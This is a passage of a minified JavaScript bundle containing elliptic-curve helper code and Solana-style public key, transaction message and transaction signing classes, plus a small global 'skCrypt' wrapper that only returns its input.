          g = (We(m, a, e) * m) % e,
          y = (We(g, u, e) * g) % e,
          w = (We(y, a, e) * m) % e,
          b = (We(w, n, e) * l) % e,
          v = (We(b, s, e) * p) % e,
          A = (We(v, r, e) * c) % e,
          k = We(A, Mi, e);
        if (!Ni.eql(Ni.sqr(k), t)) throw new Error("Cannot find square root");
        return k;
      },
    }),
    Di = (function (t, e) {
      const n = (e) => Pi({ ...t, hash: e });
      return { ...n(e), create: n };
    })(
      {
        ...Oi,
        Fp: Ni,
        lowS: !0,
        endo: {
          beta: BigInt(
            "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
          ),
          splitScalar: (t) => {
            const e = Oi.n,
              n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
              r = -Ri * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
              o = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
              i = n,
              s = BigInt("0x100000000000000000000000000000000"),
              a = Li(i * t, e),
              u = Li(-r * t, e);
            let c = Ke(t - a * n - u * o, e),
              l = Ke(-a * r - u * i, e);
            const d = c > s,
              f = l > s;
            if ((d && (c = e - c), f && (l = e - l), c > s || l > s))
              throw new Error("splitScalar: Endomorphism failed, k=" + t);
            return { k1neg: d, k1: c, k2neg: f, k2: l };
          },
        },
      },
      ye
    );
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Ui = On.utils.randomPrivateKey,
    qi = () => {
      const t = On.utils.randomPrivateKey(),
        e = zi(t),
        n = new Uint8Array(64);
      return n.set(t), n.set(e, 32), { publicKey: e, secretKey: n };
    },
    zi = On.getPublicKey;
  function Ki(t) {
    try {
      return On.ExtendedPoint.fromHex(t), !0;
    } catch {
      return !1;
    }
  }
  const Wi = (t, e) => On.sign(t, e.slice(0, 32)),
    Fi = On.verify,
    ji = (t) =>
      ft.isBuffer(t)
        ? t
        : t instanceof Uint8Array
        ? ft.from(t.buffer, t.byteOffset, t.byteLength)
        : ft.from(t);
  let Gi = class {
    constructor(t) {
      Object.assign(this, t);
    }
    encode() {
      return ft.from(Br.serialize(Vi, this));
    }
    static decode(t) {
      return Br.deserialize(Vi, this, t);
    }
    static decodeUnchecked(t) {
      return Br.deserializeUnchecked(Vi, this, t);
    }
  };
  const Vi = new Map();
  var Hi;
  const Zi = 32;
  let Xi = 1;
  class Ji extends Gi {
    constructor(t) {
      if (
        (super({}),
        (this._bn = void 0),
        (function (t) {
          return void 0 !== t._bn;
        })(t))
      )
        this._bn = t._bn;
      else {
        if ("string" == typeof t) {
          const e = sr.decode(t);
          if (e.length != Zi) throw new Error("Invalid public key input");
          this._bn = new Yn(e);
        } else this._bn = new Yn(t);
        if (this._bn.byteLength() > Zi)
          throw new Error("Invalid public key input");
      }
    }
    static unique() {
      const t = new Ji(Xi);
      return (Xi += 1), new Ji(t.toBuffer());
    }
    equals(t) {
      return this._bn.eq(t._bn);
    }
    toBase58() {
      return sr.encode(this.toBytes());
    }
    toJSON() {
      return this.toBase58();
    }
    toBytes() {
      const t = this.toBuffer();
      return new Uint8Array(t.buffer, t.byteOffset, t.byteLength);
    }
    toBuffer() {
      const t = this._bn.toArrayLike(ft);
      if (t.length === Zi) return t;
      const e = ft.alloc(32);
      return t.copy(e, 32 - t.length), e;
    }
    get [Symbol.toStringTag]() {
      return `PublicKey(${this.toString()})`;
    }
    toString() {
      return this.toBase58();
    }
    static async createWithSeed(t, e, n) {
      const r = ft.concat([t.toBuffer(), ft.from(e), n.toBuffer()]),
        o = ar(r);
      return new Ji(o);
    }
    static createProgramAddressSync(t, e) {
      let n = ft.alloc(0);
      t.forEach(function (t) {
        if (t.length > 32) throw new TypeError("Max seed length exceeded");
        n = ft.concat([n, ji(t)]);
      }),
        (n = ft.concat([n, e.toBuffer(), ft.from("ProgramDerivedAddress")]));
      const r = ar(n);
      if (Ki(r))
        throw new Error("Invalid seeds, address must fall off the curve");
      return new Ji(r);
    }
    static async createProgramAddress(t, e) {
      return this.createProgramAddressSync(t, e);
    }
    static findProgramAddressSync(t, e) {
      let n,
        r = 255;
      for (; 0 != r; ) {
        try {
          const o = t.concat(ft.from([r]));
          n = this.createProgramAddressSync(o, e);
        } catch (o) {
          if (o instanceof TypeError) throw o;
          r--;
          continue;
        }
        return [n, r];
      }
      throw new Error("Unable to find a viable program address nonce");
    }
    static async findProgramAddress(t, e) {
      return this.findProgramAddressSync(t, e);
    }
    static isOnCurve(t) {
      return Ki(new Ji(t).toBytes());
    }
  }
  (Hi = Ji),
    (Ji.default = new Hi("11111111111111111111111111111111")),
    Vi.set(Ji, { kind: "struct", fields: [["_bn", "u256"]] });
  const Yi = new Ji("BPFLoader1111111111111111111111111111111111"),
    Qi = 1232,
    $i = 127;
  class ts extends Error {
    constructor(t) {
      super(`Signature ${t} has expired: block height exceeded.`),
        (this.signature = void 0),
        (this.signature = t);
    }
  }
  Object.defineProperty(ts.prototype, "name", {
    value: "TransactionExpiredBlockheightExceededError",
  });
  class es extends Error {
    constructor(t, e) {
      super(
        `Transaction was not confirmed in ${e.toFixed(
          2
        )} seconds. It is unknown if it succeeded or failed. Check signature ${t} using the Solana Explorer or CLI tools.`
      ),
        (this.signature = void 0),
        (this.signature = t);
    }
  }
  Object.defineProperty(es.prototype, "name", {
    value: "TransactionExpiredTimeoutError",
  });
  class ns extends Error {
    constructor(t) {
      super(`Signature ${t} has expired: the nonce is no longer valid.`),
        (this.signature = void 0),
        (this.signature = t);
    }
  }
  Object.defineProperty(ns.prototype, "name", {
    value: "TransactionExpiredNonceInvalidError",
  });
  class rs {
    constructor(t, e) {
      (this.staticAccountKeys = void 0),
        (this.accountKeysFromLookups = void 0),
        (this.staticAccountKeys = t),
        (this.accountKeysFromLookups = e);
    }
    keySegments() {
      const t = [this.staticAccountKeys];
      return (
        this.accountKeysFromLookups &&
          (t.push(this.accountKeysFromLookups.writable),
          t.push(this.accountKeysFromLookups.readonly)),
        t
      );
    }
    get(t) {
      for (const e of this.keySegments()) {
        if (t < e.length) return e[t];
        t -= e.length;
      }
    }
    get length() {
      return this.keySegments().flat().length;
    }
    compileInstructions(t) {
      if (this.length > 256)
        throw new Error(
          "Account index overflow encountered during compilation"
        );
      const e = new Map();
      this.keySegments()
        .flat()
        .forEach((t, n) => {
          e.set(t.toBase58(), n);
        });
      const n = (t) => {
        const n = e.get(t.toBase58());
        if (void 0 === n)
          throw new Error(
            "Encountered an unknown instruction account key during compilation"
          );
        return n;
      };
      return t.map((t) => ({
        programIdIndex: n(t.programId),
        accountKeyIndexes: t.keys.map((t) => n(t.pubkey)),
        data: t.data,
      }));
    }
  }
  const os = (t = "publicKey") => Er.blob(32, t),
    is = (t = "signature") => Er.blob(64, t),
    ss = (t = "string") => {
      const e = Er.struct(
          [
            Er.u32("length"),
            Er.u32("lengthPadding"),
            Er.blob(Er.offset(Er.u32(), -8), "chars"),
          ],
          t
        ),
        n = e.decode.bind(e),
        r = e.encode.bind(e),
        o = e;
      return (
        (o.decode = (t, e) => n(t, e).chars.toString()),
        (o.encode = (t, e, n) => {
          const o = { chars: ft.from(t, "utf8") };
          return r(o, e, n);
        }),
        (o.alloc = (t) =>
          Er.u32().span + Er.u32().span + ft.from(t, "utf8").length),
        o
      );
    };
  function as(t, e) {
    const n = (t) => {
      if (t.span >= 0) return t.span;
      if ("function" == typeof t.alloc) return t.alloc(e[t.property]);
      if ("count" in t && "elementLayout" in t) {
        const r = e[t.property];
        if (Array.isArray(r)) return r.length * n(t.elementLayout);
      } else if ("fields" in t) return as({ layout: t }, e[t.property]);
      return 0;
    };
    let r = 0;
    return (
      t.layout.fields.forEach((t) => {
        r += n(t);
      }),
      r
    );
  }
  function us(t) {
    let e = 0,
      n = 0;
    for (;;) {
      let r = t.shift();
      if (((e |= (127 & r) << (7 * n)), (n += 1), !(128 & r))) break;
    }
    return e;
  }
  function cs(t, e) {
    let n = e;
    for (;;) {
      let e = 127 & n;
      if (((n >>= 7), 0 == n)) {
        t.push(e);
        break;
      }
      (e |= 128), t.push(e);
    }
  }
  function ls(t, e) {
    if (!t) throw new Error(e || "Assertion failed");
  }
  class ds {
    constructor(t, e) {
      (this.payer = void 0),
        (this.keyMetaMap = void 0),
        (this.payer = t),
        (this.keyMetaMap = e);
    }
    static compile(t, e) {
      const n = new Map(),
        r = (t) => {
          const e = t.toBase58();
          let r = n.get(e);
          return (
            void 0 === r &&
              ((r = { isSigner: !1, isWritable: !1, isInvoked: !1 }),
              n.set(e, r)),
            r
          );
        },
        o = r(e);
      (o.isSigner = !0), (o.isWritable = !0);
      for (const i of t) {
        r(i.programId).isInvoked = !0;
        for (const t of i.keys) {
          const e = r(t.pubkey);
          e.isSigner || (e.isSigner = t.isSigner),
            e.isWritable || (e.isWritable = t.isWritable);
        }
      }
      return new ds(e, n);
    }
    getMessageComponents() {
      const t = [...this.keyMetaMap.entries()];
      ls(t.length <= 256, "Max static account keys length exceeded");
      const e = t.filter(([, t]) => t.isSigner && t.isWritable),
        n = t.filter(([, t]) => t.isSigner && !t.isWritable),
        r = t.filter(([, t]) => !t.isSigner && t.isWritable),
        o = t.filter(([, t]) => !t.isSigner && !t.isWritable),
        i = {
          numRequiredSignatures: e.length + n.length,
          numReadonlySignedAccounts: n.length,
          numReadonlyUnsignedAccounts: o.length,
        };
      {
        ls(e.length > 0, "Expected at least one writable signer key");
        const [t] = e[0];
        ls(
          t === this.payer.toBase58(),
          "Expected first writable signer key to be the fee payer"
        );
      }
      return [
        i,
        [
          ...e.map(([t]) => new Ji(t)),
          ...n.map(([t]) => new Ji(t)),
          ...r.map(([t]) => new Ji(t)),
          ...o.map(([t]) => new Ji(t)),
        ],
      ];
    }
    extractTableLookup(t) {
      const [e, n] = this.drainKeysFoundInLookupTable(
          t.state.addresses,
          (t) => !t.isSigner && !t.isInvoked && t.isWritable
        ),
        [r, o] = this.drainKeysFoundInLookupTable(
          t.state.addresses,
          (t) => !t.isSigner && !t.isInvoked && !t.isWritable
        );
      if (0 !== e.length || 0 !== r.length)
        return [
          { accountKey: t.key, writableIndexes: e, readonlyIndexes: r },
          { writable: n, readonly: o },
        ];
    }
    drainKeysFoundInLookupTable(t, e) {
      const n = new Array(),
        r = new Array();
      for (const [o, i] of this.keyMetaMap.entries())
        if (e(i)) {
          const e = new Ji(o),
            i = t.findIndex((t) => t.equals(e));
          i >= 0 &&
            (ls(i < 256, "Max lookup table index exceeded"),
            n.push(i),
            r.push(e),
            this.keyMetaMap.delete(o));
        }
      return [n, r];
    }
  }
  const fs = "Reached end of buffer unexpectedly";
  function hs(t) {
    if (0 === t.length) throw new Error(fs);
    return t.shift();
  }
  function ps(t, ...e) {
    const [n] = e;
    if (2 === e.length ? n + (e[1] ?? 0) > t.length : n >= t.length)
      throw new Error(fs);
    return t.splice(...e);
  }
  class ms {
    constructor(t) {
      (this.header = void 0),
        (this.accountKeys = void 0),
        (this.recentBlockhash = void 0),
        (this.instructions = void 0),
        (this.indexToProgramIds = new Map()),
        (this.header = t.header),
        (this.accountKeys = t.accountKeys.map((t) => new Ji(t))),
        (this.recentBlockhash = t.recentBlockhash),
        (this.instructions = t.instructions),
        this.instructions.forEach((t) =>
          this.indexToProgramIds.set(
            t.programIdIndex,
            this.accountKeys[t.programIdIndex]
          )
        );
    }
    get version() {
      return "legacy";
    }
    get staticAccountKeys() {
      return this.accountKeys;
    }
    get compiledInstructions() {
      return this.instructions.map((t) => ({
        programIdIndex: t.programIdIndex,
        accountKeyIndexes: t.accounts,
        data: sr.decode(t.data),
      }));
    }
    get addressTableLookups() {
      return [];
    }
    getAccountKeys() {
      return new rs(this.staticAccountKeys);
    }
    static compile(t) {
      const e = ds.compile(t.instructions, t.payerKey),
        [n, r] = e.getMessageComponents(),
        o = new rs(r)
          .compileInstructions(t.instructions)
          .map((t) => ({
            programIdIndex: t.programIdIndex,
            accounts: t.accountKeyIndexes,
            data: sr.encode(t.data),
          }));
      return new ms({
        header: n,
        accountKeys: r,
        recentBlockhash: t.recentBlockhash,
        instructions: o,
      });
    }
    isAccountSigner(t) {
      return t < this.header.numRequiredSignatures;
    }
    isAccountWritable(t) {
      const e = this.header.numRequiredSignatures;
      if (t >= this.header.numRequiredSignatures) {
        return (
          t - e <
          this.accountKeys.length - e - this.header.numReadonlyUnsignedAccounts
        );
      }
      return t < e - this.header.numReadonlySignedAccounts;
    }
    isProgramId(t) {
      return this.indexToProgramIds.has(t);
    }
    programIds() {
      return [...this.indexToProgramIds.values()];
    }
    nonProgramIds() {
      return this.accountKeys.filter((t, e) => !this.isProgramId(e));
    }
    serialize() {
      const t = this.accountKeys.length;
      let e = [];
      cs(e, t);
      const n = this.instructions.map((t) => {
        const { accounts: e, programIdIndex: n } = t,
          r = Array.from(sr.decode(t.data));
        let o = [];
        cs(o, e.length);
        let i = [];
        return (
          cs(i, r.length),
          {
            programIdIndex: n,
            keyIndicesCount: ft.from(o),
            keyIndices: e,
            dataLength: ft.from(i),
            data: r,
          }
        );
      });
      let r = [];
      cs(r, n.length);
      let o = ft.alloc(Qi);
      ft.from(r).copy(o);
      let i = r.length;
      n.forEach((t) => {
        const e = Er.struct([
          Er.u8("programIdIndex"),
          Er.blob(t.keyIndicesCount.length, "keyIndicesCount"),
          Er.seq(Er.u8("keyIndex"), t.keyIndices.length, "keyIndices"),
          Er.blob(t.dataLength.length, "dataLength"),
          Er.seq(Er.u8("userdatum"), t.data.length, "data"),
        ]).encode(t, o, i);
        i += e;
      }),
        (o = o.slice(0, i));
      const s = Er.struct([
          Er.blob(1, "numRequiredSignatures"),
          Er.blob(1, "numReadonlySignedAccounts"),
          Er.blob(1, "numReadonlyUnsignedAccounts"),
          Er.blob(e.length, "keyCount"),
          Er.seq(os("key"), t, "keys"),
          os("recentBlockhash"),
        ]),
        a = {
          numRequiredSignatures: ft.from([this.header.numRequiredSignatures]),
          numReadonlySignedAccounts: ft.from([
            this.header.numReadonlySignedAccounts,
          ]),
          numReadonlyUnsignedAccounts: ft.from([
            this.header.numReadonlyUnsignedAccounts,
          ]),
          keyCount: ft.from(e),
          keys: this.accountKeys.map((t) => ji(t.toBytes())),
          recentBlockhash: sr.decode(this.recentBlockhash),
        };
      let u = ft.alloc(2048);
      const c = s.encode(a, u);
      return o.copy(u, c), u.slice(0, c + o.length);
    }
    static from(t) {
      let e = [...t];
      const n = hs(e);
      if (n !== (n & $i))
        throw new Error(
          "Versioned messages must be deserialized with VersionedMessage.deserialize()"
        );
      const r = hs(e),
        o = hs(e),
        i = us(e);
      let s = [];
      for (let d = 0; d < i; d++) {
        const t = ps(e, 0, Zi);
        s.push(new Ji(ft.from(t)));
      }
      const a = ps(e, 0, Zi),
        u = us(e);
      let c = [];
      for (let d = 0; d < u; d++) {
        const t = hs(e),
          n = ps(e, 0, us(e)),
          r = ps(e, 0, us(e)),
          o = sr.encode(ft.from(r));
        c.push({ programIdIndex: t, accounts: n, data: o });
      }
      const l = {
        header: {
          numRequiredSignatures: n,
          numReadonlySignedAccounts: r,
          numReadonlyUnsignedAccounts: o,
        },
        recentBlockhash: sr.encode(ft.from(a)),
        accountKeys: s,
        instructions: c,
      };
      return new ms(l);
    }
  }
  class gs {
    constructor(t) {
      (this.header = void 0),
        (this.staticAccountKeys = void 0),
        (this.recentBlockhash = void 0),
        (this.compiledInstructions = void 0),
        (this.addressTableLookups = void 0),
        (this.header = t.header),
        (this.staticAccountKeys = t.staticAccountKeys),
        (this.recentBlockhash = t.recentBlockhash),
        (this.compiledInstructions = t.compiledInstructions),
        (this.addressTableLookups = t.addressTableLookups);
    }
    get version() {
      return 0;
    }
    get numAccountKeysFromLookups() {
      let t = 0;
      for (const e of this.addressTableLookups)
        t += e.readonlyIndexes.length + e.writableIndexes.length;
      return t;
    }
    getAccountKeys(t) {
      let e;
      if (t && "accountKeysFromLookups" in t && t.accountKeysFromLookups) {
        if (
          this.numAccountKeysFromLookups !=
          t.accountKeysFromLookups.writable.length +
            t.accountKeysFromLookups.readonly.length
        )
          throw new Error(
            "Failed to get account keys because of a mismatch in the number of account keys from lookups"
          );
        e = t.accountKeysFromLookups;
      } else if (
        t &&
        "addressLookupTableAccounts" in t &&
        t.addressLookupTableAccounts
      )
        e = this.resolveAddressTableLookups(t.addressLookupTableAccounts);
      else if (this.addressTableLookups.length > 0)
        throw new Error(
          "Failed to get account keys because address table lookups were not resolved"
        );
      return new rs(this.staticAccountKeys, e);
    }
    isAccountSigner(t) {
      return t < this.header.numRequiredSignatures;
    }
    isAccountWritable(t) {
      const e = this.header.numRequiredSignatures,
        n = this.staticAccountKeys.length;
      if (t >= n) {
        return (
          t - n <
          this.addressTableLookups.reduce(
            (t, e) => t + e.writableIndexes.length,
            0
          )
        );
      }
      if (t >= this.header.numRequiredSignatures) {
        return t - e < n - e - this.header.numReadonlyUnsignedAccounts;
      }
      return t < e - this.header.numReadonlySignedAccounts;
    }
    resolveAddressTableLookups(t) {
      const e = { writable: [], readonly: [] };
      for (const n of this.addressTableLookups) {
        const r = t.find((t) => t.key.equals(n.accountKey));
        if (!r)
          throw new Error(
            `Failed to find address lookup table account for table key ${n.accountKey.toBase58()}`
          );
        for (const t of n.writableIndexes) {
          if (!(t < r.state.addresses.length))
            throw new Error(
              `Failed to find address for index ${t} in address lookup table ${n.accountKey.toBase58()}`
            );
          e.writable.push(r.state.addresses[t]);
        }
        for (const t of n.readonlyIndexes) {
          if (!(t < r.state.addresses.length))
            throw new Error(
              `Failed to find address for index ${t} in address lookup table ${n.accountKey.toBase58()}`
            );
          e.readonly.push(r.state.addresses[t]);
        }
      }
      return e;
    }
    static compile(t) {
      const e = ds.compile(t.instructions, t.payerKey),
        n = new Array(),
        r = { writable: new Array(), readonly: new Array() },
        o = t.addressLookupTableAccounts || [];
      for (const u of o) {
        const t = e.extractTableLookup(u);
        if (void 0 !== t) {
          const [e, { writable: o, readonly: i }] = t;
          n.push(e), r.writable.push(...o), r.readonly.push(...i);
        }
      }
      const [i, s] = e.getMessageComponents(),
        a = new rs(s, r).compileInstructions(t.instructions);
      return new gs({
        header: i,
        staticAccountKeys: s,
        recentBlockhash: t.recentBlockhash,
        compiledInstructions: a,
        addressTableLookups: n,
      });
    }
    serialize() {
      const t = Array();
      cs(t, this.staticAccountKeys.length);
      const e = this.serializeInstructions(),
        n = Array();
      cs(n, this.compiledInstructions.length);
      const r = this.serializeAddressTableLookups(),
        o = Array();
      cs(o, this.addressTableLookups.length);
      const i = Er.struct([
          Er.u8("prefix"),
          Er.struct(
            [
              Er.u8("numRequiredSignatures"),
              Er.u8("numReadonlySignedAccounts"),
              Er.u8("numReadonlyUnsignedAccounts"),
            ],
            "header"
          ),
          Er.blob(t.length, "staticAccountKeysLength"),
          Er.seq(os(), this.staticAccountKeys.length, "staticAccountKeys"),
          os("recentBlockhash"),
          Er.blob(n.length, "instructionsLength"),
          Er.blob(e.length, "serializedInstructions"),
          Er.blob(o.length, "addressTableLookupsLength"),
          Er.blob(r.length, "serializedAddressTableLookups"),
        ]),
        s = new Uint8Array(Qi),
        a = i.encode(
          {
            prefix: 128,
            header: this.header,
            staticAccountKeysLength: new Uint8Array(t),
            staticAccountKeys: this.staticAccountKeys.map((t) => t.toBytes()),
            recentBlockhash: sr.decode(this.recentBlockhash),
            instructionsLength: new Uint8Array(n),
            serializedInstructions: e,
            addressTableLookupsLength: new Uint8Array(o),
            serializedAddressTableLookups: r,
          },
          s
        );
      return s.slice(0, a);
    }
    serializeInstructions() {
      let t = 0;
      const e = new Uint8Array(Qi);
      for (const n of this.compiledInstructions) {
        const r = Array();
        cs(r, n.accountKeyIndexes.length);
        const o = Array();
        cs(o, n.data.length);
        t += Er.struct([
          Er.u8("programIdIndex"),
          Er.blob(r.length, "encodedAccountKeyIndexesLength"),
          Er.seq(Er.u8(), n.accountKeyIndexes.length, "accountKeyIndexes"),
          Er.blob(o.length, "encodedDataLength"),
          Er.blob(n.data.length, "data"),
        ]).encode(
          {
            programIdIndex: n.programIdIndex,
            encodedAccountKeyIndexesLength: new Uint8Array(r),
            accountKeyIndexes: n.accountKeyIndexes,
            encodedDataLength: new Uint8Array(o),
            data: n.data,
          },
          e,
          t
        );
      }
      return e.slice(0, t);
    }
    serializeAddressTableLookups() {
      let t = 0;
      const e = new Uint8Array(Qi);
      for (const n of this.addressTableLookups) {
        const r = Array();
        cs(r, n.writableIndexes.length);
        const o = Array();
        cs(o, n.readonlyIndexes.length);
        t += Er.struct([
          os("accountKey"),
          Er.blob(r.length, "encodedWritableIndexesLength"),
          Er.seq(Er.u8(), n.writableIndexes.length, "writableIndexes"),
          Er.blob(o.length, "encodedReadonlyIndexesLength"),
          Er.seq(Er.u8(), n.readonlyIndexes.length, "readonlyIndexes"),
        ]).encode(
          {
            accountKey: n.accountKey.toBytes(),
            encodedWritableIndexesLength: new Uint8Array(r),
            writableIndexes: n.writableIndexes,
            encodedReadonlyIndexesLength: new Uint8Array(o),
            readonlyIndexes: n.readonlyIndexes,
          },
          e,
          t
        );
      }
      return e.slice(0, t);
    }
    static deserialize(t) {
      let e = [...t];
      const n = hs(e),
        r = n & $i;
      ls(n !== r, "Expected versioned message but received legacy message");
      ls(
        0 === r,
        `Expected versioned message with version 0 but found version ${r}`
      );
      const o = {
          numRequiredSignatures: hs(e),
          numReadonlySignedAccounts: hs(e),
          numReadonlyUnsignedAccounts: hs(e),
        },
        i = [],
        s = us(e);
      for (let f = 0; f < s; f++) i.push(new Ji(ps(e, 0, Zi)));
      const a = sr.encode(ps(e, 0, Zi)),
        u = us(e),
        c = [];
      for (let f = 0; f < u; f++) {
        const t = hs(e),
          n = ps(e, 0, us(e)),
          r = us(e),
          o = new Uint8Array(ps(e, 0, r));
        c.push({ programIdIndex: t, accountKeyIndexes: n, data: o });
      }
      const l = us(e),
        d = [];
      for (let f = 0; f < l; f++) {
        const t = new Ji(ps(e, 0, Zi)),
          n = ps(e, 0, us(e)),
          r = ps(e, 0, us(e));
        d.push({ accountKey: t, writableIndexes: n, readonlyIndexes: r });
      }
      return new gs({
        header: o,
        staticAccountKeys: i,
        recentBlockhash: a,
        compiledInstructions: c,
        addressTableLookups: d,
      });
    }
  }
  const ys = {
    deserializeMessageVersion(t) {
      const e = t[0],
        n = e & $i;
      return n === e ? "legacy" : n;
    },
    deserialize: (t) => {
      const e = ys.deserializeMessageVersion(t);
      if ("legacy" === e) return ms.from(t);
      if (0 === e) return gs.deserialize(t);
      throw new Error(
        `Transaction message version ${e} deserialization is not supported`
      );
    },
  };
  let ws = (function (t) {
    return (
      (t[(t.BLOCKHEIGHT_EXCEEDED = 0)] = "BLOCKHEIGHT_EXCEEDED"),
      (t[(t.PROCESSED = 1)] = "PROCESSED"),
      (t[(t.TIMED_OUT = 2)] = "TIMED_OUT"),
      (t[(t.NONCE_INVALID = 3)] = "NONCE_INVALID"),
      t
    );
  })({});
  const bs = ft.alloc(64).fill(0);
  class vs {
    constructor(t) {
      (this.keys = void 0),
        (this.programId = void 0),
        (this.data = ft.alloc(0)),
        (this.programId = t.programId),
        (this.keys = t.keys),
        t.data && (this.data = t.data);
    }
    toJSON() {
      return {
        keys: this.keys.map(({ pubkey: t, isSigner: e, isWritable: n }) => ({
          pubkey: t.toJSON(),
          isSigner: e,
          isWritable: n,
        })),
        programId: this.programId.toJSON(),
        data: [...this.data],
      };
    }
  }
  class As {
    get signature() {
      return this.signatures.length > 0 ? this.signatures[0].signature : null;
    }
    constructor(t) {
      if (
        ((this.signatures = []),
        (this.feePayer = void 0),
        (this.instructions = []),
        (this.recentBlockhash = void 0),
        (this.lastValidBlockHeight = void 0),
        (this.nonceInfo = void 0),
        (this.minNonceContextSlot = void 0),
        (this._message = void 0),
        (this._json = void 0),
        t)
      )
        if (
          (t.feePayer && (this.feePayer = t.feePayer),
          t.signatures && (this.signatures = t.signatures),
          Object.prototype.hasOwnProperty.call(t, "nonceInfo"))
        ) {
          const { minContextSlot: e, nonceInfo: n } = t;
          (this.minNonceContextSlot = e), (this.nonceInfo = n);
        } else if (
          Object.prototype.hasOwnProperty.call(t, "lastValidBlockHeight")
        ) {
          const { blockhash: e, lastValidBlockHeight: n } = t;
          (this.recentBlockhash = e), (this.lastValidBlockHeight = n);
        } else {
          const { recentBlockhash: e, nonceInfo: n } = t;
          n && (this.nonceInfo = n), (this.recentBlockhash = e);
        }
    }
    toJSON() {
      return {
        recentBlockhash: this.recentBlockhash || null,
        feePayer: this.feePayer ? this.feePayer.toJSON() : null,
        nonceInfo: this.nonceInfo
          ? {
              nonce: this.nonceInfo.nonce,
              nonceInstruction: this.nonceInfo.nonceInstruction.toJSON(),
            }
          : null,
        instructions: this.instructions.map((t) => t.toJSON()),
        signers: this.signatures.map(({ publicKey: t }) => t.toJSON()),
      };
    }
    add(...t) {
      if (0 === t.length) throw new Error("No instructions");
      return (
        t.forEach((t) => {
          "instructions" in t
            ? (this.instructions = this.instructions.concat(t.instructions))
            : "data" in t && "programId" in t && "keys" in t
            ? this.instructions.push(t)
            : this.instructions.push(new vs(t));
        }),
        this
      );
    }
    compileMessage() {
      if (
        this._message &&
        JSON.stringify(this.toJSON()) === JSON.stringify(this._json)
      )
        return this._message;
      let t, e, n;
      if (
        (this.nonceInfo
          ? ((t = this.nonceInfo.nonce),
            (e =
              this.instructions[0] != this.nonceInfo.nonceInstruction
                ? [this.nonceInfo.nonceInstruction, ...this.instructions]
                : this.instructions))
          : ((t = this.recentBlockhash), (e = this.instructions)),
        !t)
      )
        throw new Error("Transaction recentBlockhash required");
      if ((e.length < 1, 0, this.feePayer)) n = this.feePayer;
      else {
        if (!(this.signatures.length > 0 && this.signatures[0].publicKey))
          throw new Error("Transaction fee payer required");
        n = this.signatures[0].publicKey;
      }
      for (let p = 0; p < e.length; p++)
        if (void 0 === e[p].programId)
          throw new Error(
            `Transaction instruction index ${p} has undefined program id`
          );
      const r = [],
        o = [];
      e.forEach((t) => {
        t.keys.forEach((t) => {
          o.push({ ...t });
        });
        const e = t.programId.toString();
        r.includes(e) || r.push(e);
      }),
        r.forEach((t) => {
          o.push({ pubkey: new Ji(t), isSigner: !1, isWritable: !1 });
        });
      const i = [];
      o.forEach((t) => {
        const e = t.pubkey.toString(),
          n = i.findIndex((t) => t.pubkey.toString() === e);
        n > -1
          ? ((i[n].isWritable = i[n].isWritable || t.isWritable),
            (i[n].isSigner = i[n].isSigner || t.isSigner))
          : i.push(t);
      }),
        i.sort(function (t, e) {
          if (t.isSigner !== e.isSigner) return t.isSigner ? -1 : 1;
          if (t.isWritable !== e.isWritable) return t.isWritable ? -1 : 1;
          return t.pubkey
            .toBase58()
            .localeCompare(e.pubkey.toBase58(), "en", {
              localeMatcher: "best fit",
              usage: "sort",
              sensitivity: "variant",
              ignorePunctuation: !1,
              numeric: !1,
              caseFirst: "lower",
            });
        });
      const s = i.findIndex((t) => t.pubkey.equals(n));
      if (s > -1) {
        const [t] = i.splice(s, 1);
        (t.isSigner = !0), (t.isWritable = !0), i.unshift(t);
      } else i.unshift({ pubkey: n, isSigner: !0, isWritable: !0 });
      for (const p of this.signatures) {
        const t = i.findIndex((t) => t.pubkey.equals(p.publicKey));
        if (!(t > -1))
          throw new Error(`unknown signer: ${p.publicKey.toString()}`);
        i[t].isSigner || (i[t].isSigner = !0);
      }
      let a = 0,
        u = 0,
        c = 0;
      const l = [],
        d = [];
      i.forEach(({ pubkey: t, isSigner: e, isWritable: n }) => {
        e
          ? (l.push(t.toString()), (a += 1), n || (u += 1))
          : (d.push(t.toString()), n || (c += 1));
      });
      const f = l.concat(d),
        h = e.map((t) => {
          const { data: e, programId: n } = t;
          return {
            programIdIndex: f.indexOf(n.toString()),
            accounts: t.keys.map((t) => f.indexOf(t.pubkey.toString())),
            data: sr.encode(e),
          };
        });
      return (
        h.forEach((t) => {
          ls(t.programIdIndex >= 0), t.accounts.forEach((t) => ls(t >= 0));
        }),
        new ms({
          header: {
            numRequiredSignatures: a,
            numReadonlySignedAccounts: u,
            numReadonlyUnsignedAccounts: c,
          },
          accountKeys: f,
          recentBlockhash: t,
          instructions: h,
        })
      );
    }
    _compile() {
      const t = this.compileMessage(),
        e = t.accountKeys.slice(0, t.header.numRequiredSignatures);
      if (this.signatures.length === e.length) {
        if (this.signatures.every((t, n) => e[n].equals(t.publicKey))) return t;
      }
      return (
        (this.signatures = e.map((t) => ({ signature: null, publicKey: t }))), t
      );
    }
    serializeMessage() {
      return this._compile().serialize();
    }
    async getEstimatedFee(t) {
      return (await t.getFeeForMessage(this.compileMessage())).value;
    }
    setSigners(...t) {
      if (0 === t.length) throw new Error("No signers");
      const e = new Set();
      this.signatures = t
        .filter((t) => {
          const n = t.toString();
          return !e.has(n) && (e.add(n), !0);
        })
        .map((t) => ({ signature: null, publicKey: t }));
    }
    sign(...t) {
      if (0 === t.length) throw new Error("No signers");
      const e = new Set(),
        n = [];
      for (const o of t) {
        const t = o.publicKey.toString();
        e.has(t) || (e.add(t), n.push(o));
      }
      this.signatures = n.map((t) => ({
        signature: null,
        publicKey: t.publicKey,
      }));
      const r = this._compile();
      this._partialSign(r, ...n);
    }
    partialSign(...t) {
      if (0 === t.length) throw new Error("No signers");
      const e = new Set(),
        n = [];
      for (const o of t) {
        const t = o.publicKey.toString();
        e.has(t) || (e.add(t), n.push(o));
      }
      const r = this._compile();
      this._partialSign(r, ...n);
    }
    _partialSign(t, ...e) {
      const n = t.serialize();
      e.forEach((t) => {
        const e = Wi(n, t.secretKey);
        this._addSignature(t.publicKey, ji(e));
      });
    }
    addSignature(t, e) {
      this._compile(), this._addSignature(t, e);
    }
    _addSignature(t, e) {
      ls(64 === e.length);
      const n = this.signatures.findIndex((e) => t.equals(e.publicKey));
      if (n < 0) throw new Error(`unknown signer: ${t.toString()}`);
